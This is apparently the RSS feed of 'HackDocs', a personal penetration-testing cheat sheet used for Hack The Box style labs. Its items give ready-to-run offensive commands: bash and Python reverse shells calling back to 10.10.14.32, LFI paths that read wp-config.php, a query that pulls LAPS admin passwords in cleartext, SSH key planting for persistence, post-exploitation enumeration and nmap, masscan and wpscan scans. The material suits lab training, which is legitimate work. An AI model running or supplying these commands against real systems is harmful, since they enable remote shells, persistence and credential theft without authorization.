<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hackdocs on HackDocs</title><link>/</link><description>Recent content in Hackdocs on HackDocs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 04 May 2022 13:03:15 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>BurpSuite</title><link>/misc/burpsuite/</link><pubDate>Wed, 04 May 2022 13:03:15 +0200</pubDate><guid>/misc/burpsuite/</guid><description>BurpSuite Tips Add all subdomains to scope :
(^|^[^:]+:\/\/|[^\.]+\.)google.* Source</description></item><item><title>LAPS</title><link>/maintaining-access/ad/laps/</link><pubDate>Wed, 04 May 2022 13:03:15 +0200</pubDate><guid>/maintaining-access/ad/laps/</guid><description>LAPS Get password in cleartext get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd', 'ms-mcs-admpwdexpirationtime'</description></item><item><title>LFI</title><link>/gaining-access/website-hacking/lfi/</link><pubDate>Wed, 04 May 2022 13:03:15 +0200</pubDate><guid>/gaining-access/website-hacking/lfi/</guid><description>LFI General info Some LFI will look like so : http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
Sometimes, the several &amp;lsquo;../../../&amp;rsquo; can be translated to : //, eg. :
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=//wp-config.php
This is better looking, and shorter&amp;hellip;
In this case, the LFI can also be used to get a list of all running process by using the info from the /proc filesytem. However, since the LFI return &amp;ldquo;entire&amp;rdquo; PHP code, it means we won&amp;rsquo;t be able to execute any code.</description></item><item><title>Python2 pip</title><link>/misc/installing-pip-on-python2/</link><pubDate>Wed, 04 May 2022 13:03:15 +0200</pubDate><guid>/misc/installing-pip-on-python2/</guid><description>Installing python2 pip curl -O https://bootstrap.pypa.io/pip/2.7/get-pip.py sudo python2 get-pip.py</description></item><item><title>Upgrading Shells</title><link>/maintaining-access/shells/upgrading-shells/</link><pubDate>Wed, 04 May 2022 13:03:15 +0200</pubDate><guid>/maintaining-access/shells/upgrading-shells/</guid><description>Upgrading shell python method python -c 'import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)'
script method SHELL=/bin/bash script -q /dev/null
common stuff Then type CTRL+Z ; Type stty raw -echo;fg then reset. Also, make sure to use / test with sh, bash, etc. and python, python2, python3
Finally, adjust size, where X and Y are your own values :
stty rows X columns Y</description></item><item><title>Command history</title><link>/maintaining-access/privesc/command-history/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/maintaining-access/privesc/command-history/</guid><description>Linux Command history can be found /~.bash_history. Make sure to check variant for other such as zsh, fish, etc.
Also, the history command can be used.
Windows cmd doskey /history
Powershell PowerShell command history can be found in :
Users\$name\appdata\roaming\Microsoft\Windows\PowerShell\PSReadline then gc ConsoleHost_history.txt
You can also try Get-History | Format-List -Property *</description></item><item><title>Deposing an SSH key</title><link>/maintaining-access/deposing-an-ssh-key/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/maintaining-access/deposing-an-ssh-key/</guid><description>Generate key ssh-keygen -f $key
Place it cat $key.pub, then place it under ~/.ssh/authorized_keys
Change rights chmod 600 ~/.ssh/authorized_keys chmod 600 $key</description></item><item><title>Got Shell!?</title><link>/maintaining-access/shells/got-shell/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/maintaining-access/shells/got-shell/</guid><description>What to do when you have a shell?
Linux history
whoami
uname -a
cat /etc/issue
cat /etc/passwd
sudo -l
crontab -l
ls -lhtrR /etc/cron*
ls -lhtrR /etc/sudo*
ls -lhtrR /home
LinPEAS / LSE
Windows set
getuid
ipconfig /all
arp -a
netstat -ano
dir C:\
WinPEAS</description></item><item><title>masscan</title><link>/scanning/masscan/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/scanning/masscan/</guid><description>Full scan sudo masscan -p1-65535 --rate=10000 -oG scans/masscan $IP</description></item><item><title>nmap</title><link>/scanning/nmap/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/scanning/nmap/</guid><description>Classic scan (for HTB box) sudo nmap -sC -sV -oA scans\$box_name Full scan sudo nmap -p- -T4 scans\$box_name</description></item><item><title>Popping a Shell!</title><link>/maintaining-access/shells/popping-a-shell/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/maintaining-access/shells/popping-a-shell/</guid><description>A few ways to pop a shell&amp;hellip;
/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.32/1234 0&amp;gt;&amp;amp;1'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.10.14.32&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);'
Python in a file :
import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.32&amp;#34;,1235)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;])</description></item><item><title>Website scanning</title><link>/scanning/website-scanning/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><guid>/scanning/website-scanning/</guid><description>Nikto Classic scan nikto -h $site
Gobuster Classic scan gobuster dir -u $site -w &amp;quot;/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt&amp;quot; -t 20 -o scans/gobuster
VHOST scan gobuster vhost -u $site -w &amp;quot;/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt&amp;quot; -t 20 -o scans/gobuster_vhost
Wordpress Classic Wordpress scan Quick scan :
wpscan --url $site
Aggressive scan In order to enumerate all plugins :
wpscan --url $site --plugins-detection aggressive
With token wpscan --url $site --api-token $token</description></item><item><title/><link>/_footer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/_footer/</guid><description>hackdocs</description></item></channel></rss>